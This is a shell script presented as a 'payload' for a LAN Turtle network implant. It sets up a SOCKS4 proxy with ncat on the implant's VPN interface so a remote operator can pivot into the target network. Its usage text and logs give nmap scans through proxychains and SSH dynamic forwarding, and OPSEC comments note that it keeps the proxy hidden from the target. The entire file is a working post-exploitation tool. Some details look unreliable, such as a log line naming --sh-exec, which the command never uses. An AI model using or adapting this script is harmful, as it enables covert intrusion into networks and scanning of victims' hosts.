#!/bin/sh
# ============================================================================
# PAYLOAD: pivot-proxy.sh — Network Pivot via SOCKS Proxy
# DEVICE:  LAN Turtle (Hak5) — OpenWrt / BusyBox ash
# PURPOSE: Establish SOCKS proxy on VPN interface for operator pivoting
#          into the target network through the implant
# TOOLS:   ncat (with SSL support, installed)
# OPSEC:   Binds to tun0 only (VPN overlay). Not reachable from target net.
#          No persistent state. PID tracked for clean shutdown.
# ============================================================================

# --- Configuration -----------------------------------------------------------
BIND_ADDR="10.8.0.2"                  # VPN interface (Turtle side)
SOCKS_PORT=1080                        # SOCKS proxy port
PIDFILE="/tmp/pivot-proxy.pid"
LOG="/tmp/pivot-proxy.log"

# --- Functions ---------------------------------------------------------------
usage() {
    echo "Usage: $0 <start|stop|status> [port]"
    echo ""
    echo "Starts a SOCKS4 proxy on the VPN interface for operator pivoting."
    echo "Operator connects via: ssh -D or proxychains through Pineapple."
    echo ""
    echo "Default bind: ${BIND_ADDR}:${SOCKS_PORT}"
    echo ""
    echo "Operator usage (from Pineapple or over VPN):"
    echo "  proxychains nmap -sT 192.168.1.0/24"
    echo "  curl --socks4 10.8.0.2:${SOCKS_PORT} http://target"
    echo ""
    echo "Or use SSH dynamic forwarding instead (no ncat needed):"
    echo "  ssh -D 1080 -p 2222 root@localhost  (from Pineapple)"
    exit 1
}

log() {
    echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG"
}

check_vpn() {
    if ! ip addr show tun0 > /dev/null 2>&1; then
        log "ERROR: tun0 not up. VPN must be connected first."
        return 1
    fi
    # Verify our VPN address
    _vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -o 'inet [0-9.]*' | awk '{print $2}')
    if [ -z "$_vpn_ip" ]; then
        log "ERROR: No IP on tun0."
        return 1
    fi
    BIND_ADDR="$_vpn_ip"
    return 0
}

start_proxy() {
    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        log "Already running (PID $(cat "$PIDFILE"))"
        return 1
    fi

    check_vpn || return 1

    log "=== Pivot Proxy Started ==="
    log "Bind: ${BIND_ADDR}:${SOCKS_PORT}"
    log "Type: SOCKS4 (ncat --sh-exec)"

    # ncat SOCKS proxy — binds to VPN interface only
    ncat --listen --keep-open \
         --source "${BIND_ADDR}" \
         -p "${SOCKS_PORT}" \
         --proxy-type socks4 \
         > /dev/null 2>&1 &

    echo $! > "$PIDFILE"
    log "ncat SOCKS proxy started (PID $!)"
    log ""
    log "Operator can now route tools through ${BIND_ADDR}:${SOCKS_PORT}"
    log "Example: proxychains4 -q nmap -sT -Pn 192.168.1.0/24"
}

stop_proxy() {
    if [ -f "$PIDFILE" ]; then
        _pid=$(cat "$PIDFILE")
        if kill -0 "$_pid" 2>/dev/null; then
            kill "$_pid"
            log "Proxy stopped (PID ${_pid})"
        else
            log "Process ${_pid} not running"
        fi
        rm -f "$PIDFILE"
    else
        log "No PID file found"
        _pid=$(pgrep -f "ncat.*socks4" 2>/dev/null)
        if [ -n "$_pid" ]; then
            kill "$_pid"
            log "Killed orphaned ncat (PID ${_pid})"
        fi
    fi
}

show_status() {
    echo "=== Pivot Proxy Status ==="
    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        echo "State: RUNNING (PID $(cat "$PIDFILE"))"
        echo "Bind:  ${BIND_ADDR}:${SOCKS_PORT}"
        echo ""
        echo "Active connections:"
        netstat -tn 2>/dev/null | grep ":${SOCKS_PORT}" || echo "  (none)"
    else
        echo "State: STOPPED"
    fi
    echo ""
    echo "VPN status:"
    ip addr show tun0 2>/dev/null | grep "inet " || echo "  tun0 DOWN"
}

# --- Main --------------------------------------------------------------------
if [ -n "$2" ]; then
    SOCKS_PORT="$2"
fi

case "${1:-}" in
    start)
        start_proxy
        ;;
    stop)
        stop_proxy
        ;;
    status)
        show_status
        ;;
    *)
        usage
        ;;
esac
